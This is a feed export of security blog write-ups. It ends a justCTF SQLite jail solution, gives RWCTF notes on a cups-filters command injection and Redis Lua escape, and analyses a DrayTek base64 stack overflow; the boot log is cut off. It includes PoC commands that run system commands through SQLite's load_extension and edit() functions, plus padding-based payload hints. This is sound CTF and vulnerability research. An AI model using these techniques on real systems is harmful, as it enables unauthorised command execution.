大概是正则多行匹配的问题了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select load_extension(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31&#39;, &#39;getchar&#39;);</span><br><span class="line"> .system &#x2F;jailed&#x2F;readflag</span><br><span class="line">Runtime error: error during initialization: </span><br><span class="line">justCTF&#123;SQL1t3_F34tur3_n0t_bug_Int3nd3d!11!!!111!!1&#125;</span><br></pre></td></tr></table></figure><h4 id="sqlite3-edit-function-execute-command"><a href="#sqlite3-edit-function-execute-command" class="headerlink" title="sqlite3 edit function execute command"></a>sqlite3 edit function execute command</h4><p>在 sqlite 还有一个名叫 <code>Edit()</code> 的函数 <sup id="fnref:4"><a href="#fn:4" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://www.sqlite.org/cli.html">[4]</span></a></sup>， 该 <code>Edit()</code> 接受一个或两个参数。第一个参数是一个值——通常是一个要编辑的大的多行字符串。第二个参数是对文本编辑器的调用。仔细阅读代码，该方法其实也是可以执行任意命令的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlite3_create_function(p-&gt;db, <span class="string">&quot;edit&quot;</span>, <span class="number">2</span>, SQLITE_UTF8, <span class="number">0</span>,</span><br><span class="line">                            editFunc, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>最后调用到 <code>editFunc</code> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">zCmd = sqlite3_mprintf(<span class="string">&quot;%s \&quot;%s\&quot;&quot;</span>, zEditor, zTempFile);</span><br><span class="line"><span class="keyword">if</span>( zCmd==<span class="number">0</span> )&#123;</span><br><span class="line">  sqlite3_result_error_nomem(context);</span><br><span class="line">  <span class="keyword">goto</span> edit_func_end;</span><br><span class="line">&#125;</span><br><span class="line">rc = system(zCmd);</span><br><span class="line">sqlite3_free(zCmd);</span><br></pre></td></tr></table></figure><p>这是在 discord 看到另外一个队的PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sqlite&gt; .open :memory:</span><br><span class="line">sqlite&gt; CREATE TABLE t(a INT, b VARCHAR(200));</span><br><span class="line">sqlite&gt; insert into t values (0, &#39;&#39;);</span><br><span class="line">sqlite&gt; update t set b&#x3D;edit(&#39;&#39;,&#39;&#x2F;jailed&#x2F;readflag&#39;) where a&#x3D;0;</span><br><span class="line">justCTF&#123;SQL1t3_F34tur3_n0t_bug_Int3nd3d!11!!!111!!1&#125;</span><br></pre></td></tr></table></figure><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><p>1 <a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf">Many-Birds-One-Stone</a><br>2 <a href="https://www.sqlite.org/c3ref/load_extension.html">load_extension</a><br>3 <a href="https://blog.csdn.net/liubingzhao/article/details/50885880">SQLite3命令行窗口常用命令</a><br>4 <a href="https://www.sqlite.org/cli.html">The edit() SQL function</a></p><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf<a href="#fnref:1" rev="footnote"> ↩</a></span></li><li id="fn:2"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">2.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://www.sqlite.org/c3ref/load_extension.html<a href="#fnref:2" rev="footnote"> ↩</a></span></li><li id="fn:3"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">3.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://blog.csdn.net/liubingzhao/article/details/50885880<a href="#fnref:3" rev="footnote"> ↩</a></span></li><li id="fn:4"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">4.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://www.sqlite.org/cli.html<a href="#fnref:4" rev="footnote"> ↩</a></span></li></ol></div></div></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="JustCTF" scheme="https://bestwing.me/tags/JustCTF/"/>
    
    <category term="sqlite" scheme="https://bestwing.me/tags/sqlite/"/>
    
  </entry>
  
  <entry>
    <title>Real World CTF 5th writeup</title>
    <link href="https://bestwing.me/RWCTF-5th-Writeup.html"/>
    <id>https://bestwing.me/RWCTF-5th-Writeup.html</id>
    <published>2023-05-16T16:00:00.000Z</published>
    <updated>2023-05-25T11:58:13.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>这次 RWCTF 比赛我一共出了两个题: 「Printer2」 和 「Hardened Redis」。至于为什么今天才在博客更新这个Writeup一个原因就是 Pritner2 相关的漏洞今天终于发布了正式补丁。</p><h2 id="Printer2"><a href="#Printer2" class="headerlink" title="Printer2"></a>Printer2</h2><p>这是 <code>OpenPrinting</code> 项目中 <code>cups-filters</code> 模块下的 Backend Error Handler（简称 beh）存在的漏洞。这里是关于 <a href="https://wiki.linuxfoundation.org/openprinting/database/backenderrorhandler">beh</a> 的介绍</p><p>漏洞点位于 <a href="https://github.com/OpenPrinting/cups-filters/blob/5c9498a57d3b331d9b1aa59df206b26a9510f335/backend/beh.c#L288">cups-filters/backed/beh.c#L288</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// (context: argv = beh &lt;job-id&gt; &lt;user&gt; &lt;title&gt; &lt;copies&gt; &lt;options&gt; [file])</span></span><br><span class="line">  <span class="built_in">snprintf</span>(cmdline, <span class="keyword">sizeof</span>(cmdline),</span><br><span class="line">  <span class="string">&quot;%s/backend/%s &#x27;%s&#x27; &#x27;%s&#x27; &#x27;%s&#x27; &#x27;%s&#x27; &#x27;%s&#x27; %s&quot;</span>,</span><br><span class="line">  cups_serverbin, scheme, argv[<span class="number">1</span>], argv[<span class="number">2</span>], argv[<span class="number">3</span>],</span><br><span class="line">        ...</span><br><span class="line">  (argc == <span class="number">6</span> ? <span class="string">&quot;1&quot;</span> : argv[<span class="number">4</span>]),</span><br><span class="line">  argv[<span class="number">5</span>], filename);</span><br><span class="line">        ...</span><br><span class="line">retval = system(cmdline) &gt;&gt; <span class="number">8</span>;</span><br></pre></td></tr></table></figure><p>可以看到这里有一个明显的命令注入， 当用户控制 user 或者 title 字段的时候可以造成任意命令执行。更详细的细节可以看我提交给官方的报告：</p><p><a href="https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-gpxc-v2m8-fr3x">report a command inject Vulnerabilities in cups-filters </a></p><h2 id="Hardened-Redis"><a href="#Hardened-Redis" class="headerlink" title="Hardened Redis"></a>Hardened Redis</h2><p>这是题目考点是在较高版本的情况下在有访问 <code>Redis</code> 的情况下如何获取  <code>Redis</code> 所在系统 shell 权限。 在高版本的 Redis 已经不能使用主从复制来获取 shell了（印象中），另外我也禁用了一些 <code>Redis</code> 的方法。 但是由于对 Redis 的熟知程度不够， 其次也是去年参加 CTF 少了， 被 <a href="https://hackmd.io/@Xion/goq_22s_authors_writeup">2022 Spring GoN Open Qual CTF</a> 的一个 <code>Redis</code> 题的解法非预期了。</p><p>下次有机会可以和大家详细分享下这个解法。</p><p>这里接着讲我的预期解法，讲到 <code>Redis</code> ， 如果大家有印象，应该会想到 <code>CVE-2022-0543</code> 。 当时这个漏洞影响了 Debian 系列的 Linux 发行版系统的包管理器所安装的 <code>Redis</code> 。因为 Debian 系列由于打包问题，Redis在Lua解析器初始化后，package变量没有被正确清除，导致攻击者可以利用它来进行Lua沙箱逃逸，从而执行任意系统命令。</p><p>这个时候我们注意到了这 Debian 系列用的 <code>Redis</code> （即使用 apt 安装 ) 所使用的 lua 解析器是 lua 5.1 ， 而且是存在一个 2015 年漏洞的 lua 解析器，虽然这个漏洞在 2015 年就被 <a href="https://github.com/redis/redis/commit/49efe300af258e83f377cd8142d2c67d66fc2e3a"><code>Redis</code>官方修复了</a>， 但是 lua 5.1 解析器并没有修复。</p><p><code>apt</code> 命令安装的redis使用的是单独的 liblua5.1.so.0</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-24-b443c11f82ebe41d313bbaf1c058f8b8-87e7f8.png" title="image-20230524155200264" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-24-b443c11f82ebe41d313bbaf1c058f8b8-87e7f8.png" alt="image-20230524155200264"></a></p><p>2015 年这个漏洞是 <code>CVE-2015-4335</code>， 另外 HN 评论区当时也提到了这个问题， </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-18-7d5da9fdabc3b657f586d9f14af353b8-7a3f85.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-18-7d5da9fdabc3b657f586d9f14af353b8-7a3f85.png"></a></p><p><a href="https://news.ycombinator.com/item?id=30617641">I think this is still ‘broken’ because Redis have applied custom patches to the )</a></p><p>虽然当时我也给  ubuntu 和 Debian 发了邮件提醒了这件事，但是他们的回复看起来是不是很想单独修复。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-18-e8eca39e1e8091cb3cd4123d47d5736a-1bc0a2.png" title="image-20230518002900794" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-18-e8eca39e1e8091cb3cd4123d47d5736a-1bc0a2.png" alt="image-20230518002900794"></a></p><p>进一步的漏洞利用与分析可以参考我 chu 师父 的博客， <a href="https://mp.weixin.qq.com/s/JxZC5pqi92xEOUT3BKdyWg">Redis CVE-2015-4335分析 </a>， 我就不赘述了。 没想到隔了这么久还是依然能受到 chu 师父的照顾。</p><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><p><a href="https://github.com/OpenPrinting/cups-filters/blob/5c9498a57d3b331d9b1aa59df206b26a9510f335/backend/beh.c#L288">cups-filters/backed/beh.c#L288</a></p><p><a href="https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-gpxc-v2m8-fr3x">report a command inject Vulnerabilities in cups-filters</a></p><p><a href="https://hackmd.io/@Xion/goq_22s_authors_writeup">2022 Spring GoN Open Qual CTF</a></p><p><a href="https://news.ycombinator.com/item?id=30617641">I think this is still ‘broken’ because Redis have applied custom patches to the … | Hacker News (ycombinator.com)</a></p><p><a href="https://github.com/redis/redis/commit/49efe300af258e83f377cd8142d2c67d66fc2e3a">disable loading lua bytecode</a></p><p><a href="https://mp.weixin.qq.com/s/JxZC5pqi92xEOUT3BKdyWg">Redis CVE-2015-4335分析 </a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="CVE-2023-24805" scheme="https://bestwing.me/tags/CVE-2023-24805/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-32548 DrayTeck 栈溢出漏洞分析</title>
    <link href="https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html"/>
    <id>https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html</id>
    <published>2023-04-28T16:00:00.000Z</published>
    <updated>2023-04-29T10:01:47.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>这个漏洞是我去年 9 月份复现的，一直拖更没有发布在我的 Blog 。因为到考虑 Blog 太久没更新了，所以趁着假期整理下笔记，然后发表在 Blog 上吧。顺便一提， 本篇文章没有什么技术含量，大佬可以忽略不看了。</p><p>我这里分析的版本是 Vigor 2912 型号 , 固件版本为 3.8.12 。固件可以从<a href="https://fw.draytek.com.tw/">官网下载</a> <sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="[Index of /Vigor2925 (draytek.com.tw)](https://fw.draytek.com.tw/Vigor2925/)">[1]</span></a></sup>, 但是这个属于DrayOS 的系统固件是需要逆向解压代码的，这部分内容不在本篇文章的讨论范围，大家可以参考漏洞的作者 slide<sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="[HEXACON2022 - Emulate it until you make it! Pwning a DrayTek Router by Philippe Laulheret - YouTube](https://www.youtube.com/watch?v=CD8HfjdDeuM)">[2]</span></a></sup> 。这里我就不展开赘述了。</p><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>解压固件后， 我们会得到一个 RTOS 的大Binary 文件, 我们可以通过 rbasefind<sup id="fnref:3"><a href="#fn:3" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="[sgayou/rbasefind: A firmware base address search tool. (github.com)](https://github.com/sgayou/rbasefind)">[3]</span></a></sup> 或者其他方法获取固件的加载基地址，例如我这里使用 rbasefind 查找出了一个结果：0x80020000</p><p>通过 IDA 加载设置好加载地址，然后等待分析结束。在这个过程中呢，我们可以再阅读下漏洞通告<sup id="fnref:4"><a href="#fn:4" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="[Unauthenticated Remote Code Execution in a Wide Range of DrayTek Vigor Routers (trellix.com)](https://www.trellix.com/en-us/about/newsroom/stories/research/rce-in-dratyek-routers.html)">[4]</span></a></sup>的描述:</p><p>Exploitation attempts can be detected by logging/alerting when a malformed base64 string is sent via a POST request to the /cgi-bin/wlogin.cgi end-point on the web management interface router. Base64 encoded strings are expected to be found in the aa and ab fields of the POST request. Malformed base64 strings indicative of an attack would have an abnormally high number of %3D padding. Any number over three should be considered suspicious.</p><p>通过这个描述我们可以得出几个结论：</p><ol><li>通过触发接口是  <code>/cgi-bin/wlogin.cgi</code> 即登录接口</li><li>提到了 <code>%3D</code> 可以猜测漏洞出现在 <code>base64_decode</code> 函数中 </li></ol><p>紧接着我抓去了一个正常登录的 HTTP 请求包，等待 IDA 分析完之后通过对字符串进行交叉引用，找到了对应的漏洞函数：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-20-c69eb298cb0fe09abc4ea7d5405e0a30-6e9f0e.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-20-c69eb298cb0fe09abc4ea7d5405e0a30-6e9f0e.png"></a></p><p>可以看到 username  和 password 都会通过 base64_decode 这个函数进行解密，这个函数的参数格式为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64_decode(<span class="keyword">char</span> *input, <span class="keyword">char</span> *output, <span class="keyword">unsigned</span> <span class="keyword">int</span> maxlen)</span><br></pre></td></tr></table></figure><p>我们看到第三个参数看似是限制了最大 decode 长度，但是实际上这个值真的生效了吗？ 我们继续往下看</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-04-29-64de88a39870b052b3e01d824a6f3b83-61799f.png" title="image-20230429164323660" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-04-29-64de88a39870b052b3e01d824a6f3b83-61799f.png" alt="image-20230429164323660"></a></p><p>这里会有一个 <code>calc_decdoe_len</code>的函数，来计算 base64 decode 后的长度是不是大于 maxlen 如果大于就退出。 那么我们就基本判定大概率问题是出现在了这个函数中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __fastcall <span class="title">calc_decode_len</span><span class="params">(<span class="keyword">char</span> *input_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> inputlen; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> decode_out_len; <span class="comment">// $a1</span></span><br><span class="line">  <span class="keyword">int</span> out_len; <span class="comment">// $v1</span></span><br><span class="line">  _BYTE *in_end_chr; <span class="comment">// $a0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> offset; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// $a1</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// $a2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !input_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  inputlen = <span class="built_in">strlen</span>(input_buf);</span><br><span class="line">  decode_out_len = <span class="number">3</span> * (inputlen &gt;&gt; <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !inputlen )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span> * (inputlen &gt;&gt; <span class="number">2</span>);</span><br><span class="line">  out_len = decode_out_len - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( input_buf[inputlen - <span class="number">1</span>] != <span class="string">&#x27;=&#x27;</span> )         <span class="comment">// 最后一位如果不是 = ， 就直接返回长度</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span> * (inputlen &gt;&gt; <span class="number">2</span>);</span><br><span class="line">  in_end_chr = &amp;input_buf[inputlen];</span><br><span class="line">  offset = decode_out_len - inputlen;</span><br><span class="line">  <span class="keyword">if</span> ( out_len != offset )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = (<span class="keyword">char</span>)*(in_end_chr - <span class="number">2</span>);             <span class="comment">// 如果倒数第二位不是 = ， 就 break ， 返回 out_len </span></span><br><span class="line">      v8 = out_len - <span class="number">1</span>;</span><br><span class="line">      --in_end_chr;</span><br><span class="line">      <span class="keyword">if</span> ( v7 != <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      --out_len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v8 != offset );                     <span class="comment">// --outlen 直到当前的字符不为 = ， 或者 长度等于 </span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> out_len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过阅读代码，我们找到了这个函数的问题所在：</p><p>大致就是， 首先通过 <code>3 * (inputlen &gt;&gt; 2);</code> 计算出一个长度 ， 然后判断最后一位是不是 = ， 如果不是直接返回， 如果是接着往下走。 </p><p>然后我们注意到这里有个减法运算 <code> offset = decode_out_len - inputlen;</code> ， 正常而言， 这里的 <code>deocde_out_len</code> 应该是小于 <code>inputlen</code> 的所以这里会是一个  负数。</p><p>然后进到 <code>do .. while ()</code> 循环中， 只有当 当前字符不为 = 或者， <code>v8 == offset</code> 的时候才会退出循环， 由于 offset 是个负数， 因此只有当前字符不为 = 才会退出返回。然会这里的长度就会<code>--out_len</code> 递减。</p><p>根据base64 的原理我们知道四个 = 为空</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64decode(<span class="string">&quot;====&quot;</span>)</span><br><span class="line"><span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因此在构造我们 payload 的时候， 每多于 maxlen（这里是 84 ） 的长度一个字符， 我们就需在后面添加  四个 等号。 这样 deocde 后的长度永远不会大于 84， 但是真正 decode 的结果却会大于 maxlen</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>拆开机器，可以发现右下角 4 个pin 的是 调试口 。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-28-bb64dffbb21d22a20a84dcf37b1fddd6-4ec5e4.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-28-bb64dffbb21d22a20a84dcf37b1fddd6-4ec5e4.png"></a></p><p>接着串口后， 可看到一些输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> ~~Hope you find out the clue here~~</span><br><span class="line">Caught reserved exception 11 - should not happen.NMI taken!!!!</span><br><span class="line">@@@die: NMI @@@</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Vigor2912-DrayLoader-v7 (May  7 2015 - 15:11:57)</span><br><span class="line"></span><br><span class="line">MT6856</span><br><span class="line">DRAM Size: 64 MB</span><br><span class="line">CPU Frequency: 700 MHZ</span><br><span class="line">Flash Manufacture ID: 0xC2, Device ID: 0x20 0x17, Name: MX25L6405D</span><br><span class="line">Flash Size: 8 MB</span><br><span class="line"></span><br><span class="line">Boot DrayOS~~</span><br><span class="line">run_drayos_image: len=5085180</span><br><span class="line">Go~~</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> !!! Maxi malloc size =31614752 (st=0X821d88e0, end=0X83fff000)!!!!</span><br><span class="line"></span><br><span class="line"> dynamic_mem_pool=0x821e52b0, size=0xc80fff[12M]!Modes: __STDC__ 32-bit mwDWORD==(unsigned long)</span><br><span class="line">mwROUNDALLOC==4 sizeof(mwData)==24 mwDataSize==24</span><br><span class="line"></span><br><span class="line">statistics: now collecting on a line basis</span><br><span class="line"></span><br><span class="line">============= Memwatch Auto Self Test =============</span><br><span class="line"></span><br><span class="line">Normal Free...DETECTED</span><br><span class="line">Double Free...DETECTED</span><br><span class="line">NULL Free.....DETECTED</span><br><span class="line">Wild Free.....DETECTED</span><br><span class="line">Underflow.....DETECTED</span><br><span class="line">Overflow......DETECTED</span><br><span class="line">Unfree 1......DETECTED</span><br><span class="line">Unfree 2......DETECTED</span><br><span class="line"></span><br><span class="line">ALL TEST OK!</span><br><span class="line">Please be assured that all <span class="built_in">test</span> buffers have freed.</span><br><span class="line">Slab kmalloc range:     [0x821E52B0:0x82E662AF](size=13111295 bytes)</span><br><span class="line">Linear malloc range:    [0x821D88D0:0x83FFF000](size=31614768 bytes)</span><br><span class="line"></span><br><span class="line"> ra_system_init() <span class="keyword">in</span>:&lt;6&gt;ISPRAM0: PA=00b68000,Size=00008000,enabled</span><br><span class="line">&lt;6&gt;CPU revision is: 00019555 (MIPS 34Kc)</span><br><span class="line">Ralink RT63365 SOC prom init</span><br><span class="line"></span><br><span class="line"> prom_init() doneFIXME!!! Do we need to complete specific hardware CPU clock setting? or time_init() would complete it ?</span><br><span class="line">set_except_vector: n=0, addr=8003cb80</span><br><span class="line">set_except_vector: n=0, addr=80027684</span><br><span class="line"></span><br><span class="line"> trap_init() <span class="keyword">done</span></span><br><span class="line"> plat_mem_setup() <span class="keyword">done</span>&lt;6&gt;NR_IRQS:64</span><br><span class="line"></span><br><span class="line"> init_IRQ()...CPU frequency 699.00 MHz</span><br><span class="line">clockevents_register_device</span><br><span class="line">cp0_timer_irq_installed: irq = 31</span><br><span class="line">__setup_irq: 